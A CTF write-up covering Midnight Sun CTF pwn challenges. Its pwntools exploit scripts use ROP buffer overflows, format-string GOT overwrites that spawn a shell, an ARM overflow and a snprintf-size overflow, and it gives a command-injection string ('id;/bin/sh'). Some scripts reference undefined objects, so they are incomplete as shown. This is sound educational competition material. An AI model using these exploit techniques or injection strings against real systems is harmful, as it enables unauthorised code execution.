## Pwn1

Basic buffer overflow.

```python
from pwn import *
context.arch = 'amd64'

r = remote("pwn1-01.play.midnightsunctf.se",10001)

pop_rdi = 0x0000000000400783
pop_rsi_r15 = 0x0000000000400781
main = 0x000000000400698

sh = flat([ 'a'*0x48, pop_rdi, elf.got['puts'], elf.plt['puts'], main ])

r.sendlineafter("buffer: ", sh)

a = u64(r.recv(6).ljust(8, b'\x00')) - libc.sym['puts']
libc.address = a

sh = flat([ 'a'*0x48, a + 0x10a38c ])

r.sendlineafter("buffer: ", sh)
r.interactive()
```

## Pwn2

Basic format string. We can change exit.got to main function and leak libc address. Then change printf.got to system and get shell.

```python
from pwn import *
context.arch = 'amd64'

r = remote("pwn2-01.play.midnightsunctf.se",10002)

sh = p32(elf.got['exit'])
sh += p32(elf.got['exit'] + 1)
sh += "%{}c%7$hhn".format(235-8)
sh += "%{}c%8$hhn".format(133-8+29)
sh += "%2$x"

r.sendlineafter("input: ", sh)

r.recvuntil("\xc0")
a = int(r.recvline().strip(), 16) - libc.sym['_IO_2_1_stdin_']
libc.address = a

system = libc.sym['system']
x1 = system & 0xff
x2 = (system >> 8) & 0xff
x3 = (system >> 16) & 0xff
sh = p32(elf.got['printf'])
sh += p32(elf.got['printf']+1)
sh += p32(elf.got['printf']+2)
sh += "%{}c%7$hhn".format(x1 - 0xc)
sh += "%{}c%8$hhn".format(x2 - x1)
sh += "%{}c%9$hhn".format(x3 - x2)

r.sendlineafter("input: ", sh)
r.recv()

r.sendlineafter("not found", "/bin/sh")
r.interactive()
```

## Pwn3

Basic arm buffer overflow.

```python
from pwn import *
context.arch = 'amd64'

#r = process(["qemu-arm", "-g", "1234", "./pwn3"])
r = remote("pwn3-01.play.midnightsunctf.se", 10003)

gadget = 0x0001fb5c
binsh = 0x00049018
system = 0x00014B5C+1

sh = '\x00'*0x88 + p32(0x10168)
sh += p32(gadget) 
sh += p32(binsh)
sh += p32(0)
sh += p32(system)

r.sendlineafter("buffer: ", sh)
r.interactive()
```

## Pwn4

A nice format string challenge. Didn't solve it, but found its solution very delicate and I learn something new.

[Reference from mebeim](https://gist.github.com/mebeim/f74504ec20399ecb9384f826391f7598)

> Basic idea:
> Copy the secret (4 bytes) from the stack to our guess variable (also on the stack) and pass the check.
>
> `%<N>d` normally this lets us print N characters total (a decimal int padded to N spaces).  
> `%*25$d` the asterisk lets us choose the value for N from the stack, so we choose `25$`, which is the position of the secret value: this will therefore print a number of chars equal to the secret value.  
> `%16$n` this will then write the number of printed chars to our variable on the stack (position 16) that is later compared with the secret.
>
> This will print *A LOT* of characters back (like 1GB of spaces), but works after trying a few times!

`%*<N>$d` 可以打印出一长串字符，这些字符的数量和栈上某个变量相等。`%<X>$n` 可以修改栈上某指针保存的值。因此，这两个格式化字符串合并起来，就可以达到栈上的复制功能，可以将某个我们不知道的 secret 复制到某个地址中。

## Pwn5

Mips pwn. [Reference](https://fireshellsecurity.team/midnight-pwn-2-3-5/)

## Pwn6

Arbitrary write. We can change `_IO_2_1_stdout_` to leak libc address, and change `_IO_2_1_stdin_` to construct a rop chain.

[Reference](http://blog.redrocket.club/2020/04/06/midnightsunctf-quals-2020-pwn6/)

## Admpanel

`system("id;/bin/sh")` to bypass the check.

## Admpanel2

There is a vuln in `log` function. `snprintf` will return requested size no matter if it already covers this size. So the max_size can be negative. Thus we can overflow and build rop chain.

```python
from pwn import *
context.arch = 'amd64'

r = remote("admpanel2-01.play.midnightsunctf.se", 31337)

pop_rdi = 0x00000000004016cb
binsh = 0x4041d3

r.sendlineafter("> ", '1')
r.sendlineafter("username: ", 'admin'+'a'*0xee+"/bin/sh")
r.sendlineafter("password: ", 'password')

r.sendlineafter("> ", '2')
sh = p64(0x4015A1)
sh += p64(pop_rdi)
sh += p64(binsh)
sh += p64(0x000000000040159B)
r.sendlineafter("execute: ", sh) 

r.interactive()
```